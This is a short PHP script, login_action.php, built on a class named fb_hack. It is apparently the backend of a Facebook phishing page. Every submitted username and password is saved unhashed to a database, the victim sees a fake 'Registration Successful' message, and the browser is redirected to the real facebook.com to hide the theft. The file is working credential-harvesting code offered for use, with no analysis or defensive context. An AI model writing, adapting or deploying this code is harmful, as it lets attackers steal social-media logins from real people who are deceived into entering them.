<?php
//login_action.php
include('functions.php');

$object = new fb_hack();

if(isset($_POST["action"]))
{
	if($_POST["action"] == 'Add')
	{
		$error = '';
		$success = '';
        $message = '';
        $url = '';
		

		    $data = array(
				':username'			=>	$object->clean_input($_POST["username"]),
				':password'			=>	$object->clean_input($_POST["password"]),
				':createdAt'		=>	$object->now
			);

			$object->query = "
			INSERT INTO users 
			(username, password, createdAt) 
			VALUES (:username, :password,:createdAt)
			";

			$object->execute($data);
			
			
			$success = 'Registration Successful. Redirecting to your dashboard';
            $url = 'https://facebook.com';

		$output = array(
			'error'		=>	$error,
            'success' => $success,
			'url'	=>	$url
		);

		echo json_encode($output);

	}

}

?>